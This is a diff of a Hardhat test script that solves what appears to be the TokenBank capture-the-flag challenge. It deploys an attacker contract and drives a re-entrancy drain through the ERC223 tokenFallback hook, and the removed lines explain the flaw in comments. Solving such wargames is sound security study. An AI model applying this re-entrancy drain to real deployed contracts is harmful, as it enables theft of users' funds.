@@ -1,64 +1,35 @@
-import crypto, { sign } from "crypto";
-import { ethers } from "hardhat";
-import { BigNumber, Contract, Signer } from "ethers";
-import { expect } from "chai";
-import { formatEtherscanTx } from "../utils/format";
-import { HDNode } from "ethers/lib/utils";
+import {ethers} from "hardhat";
+import {BigNumber, Contract, Signer} from "ethers";
+import {expect} from "chai";
+
 
 let accounts: Signer[];
-let eoa: Signer;
-let attacker: Contract;
+let attacker: Signer;
 let contract: Contract; // challenge contract
-let tx: any;
+let token : Contract;
+let withdrawValue = ethers.utils.parseEther('500000');
 
-const ATTACKER_INITIAL_BALANCE = ethers.utils.parseEther(`500000`);
-
-before(async () => {
-  accounts = await ethers.getSigners();
-  [eoa] = accounts;
-  const challengeFactory = await ethers.getContractFactory(
-    "TokenBankChallenge"
-  );
-  contract = challengeFactory.attach(
-    `0xD7FA2C15883faddFB7609fdb1D49175327Cd4Bb0`
-  );
+before(async function () {
+    accounts = await ethers.getSigners();
+    attacker = accounts[0];
+    const challengeFactory = await ethers.getContractFactory("TokenBankChallenge", attacker);
+    contract = challengeFactory.attach(`0x1c9cF129Bf1853E45E11c7BbabEA032a055F3b1D`);
+    const tokenFactory = await ethers.getContractFactory("SimpleERC223Token",attacker);
+    const tokenAddress = await contract.token();
+    token = tokenFactory.attach(tokenAddress);
 });
 
 it("solves the challenge", async function () {
-  // there's a re-entrancy issue when doing the withdraw
-  // withdraw => token.transfer => msg.sender.tokenFallback() => ...
-  // => balance is reset after the token.transfer only
-  const attackerFactory = await ethers.getContractFactory("TokenBankAttacker");
-  attacker = await attackerFactory.deploy(contract.address);
-  const tokenAddress = await contract.token();
-  const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
-  const token = await tokenFactory.attach(tokenAddress);
+    const attackerFactory = await ethers.getContractFactory("TokenBankAttacker", attacker);
+    let attackerContract = await attackerFactory.deploy(contract.address,{gasLimit:1e6});
+    let withdrawTx = await contract.withdraw(withdrawValue);
+    console.log("withdraw transaction hash:",withdrawTx.hash);
+    let transferTx = await token[`transfer(address,uint256,bytes)`](attackerContract.address,withdrawValue,[1],{gasLimit:1e6});
+    console.log("transfer transaction hash:",transferTx.hash);
+    let attackTx = await attackerContract.attack({gasLimit:1e6});
+    console.log("attack transaction hash:",attackTx.hash);
+});
 
-  await eoa.provider!.waitForTransaction(attacker.deployTransaction.hash);
-
-  // need to move tokens from eoa to contract for contract to use funds
-  // challenge => EOA
-  tx = await contract.withdraw(ATTACKER_INITIAL_BALANCE);
-  await tx.wait();
-
-  // EOA => attacker
-  tx = await token[`transfer(address,uint256)`](
-    attacker.address,
-    ATTACKER_INITIAL_BALANCE
-  );
-  await tx.wait();
-
-  // attacker => challenge
-  tx = await attacker.deposit();
-  await tx.wait();
-
-  const attackerBalance = await contract.balanceOf(attacker.address);
-  console.log(`attackerBalance`, attackerBalance.toString());
-  expect(attackerBalance).to.eq(ATTACKER_INITIAL_BALANCE);
-
-  tx = await attacker.attack();
-  await tx.wait();
-
-  const isComplete = await contract.isComplete();
-  expect(isComplete).to.be.true;
+after(async function () {
+    expect(await contract.isComplete()).to.eq(true);
 });
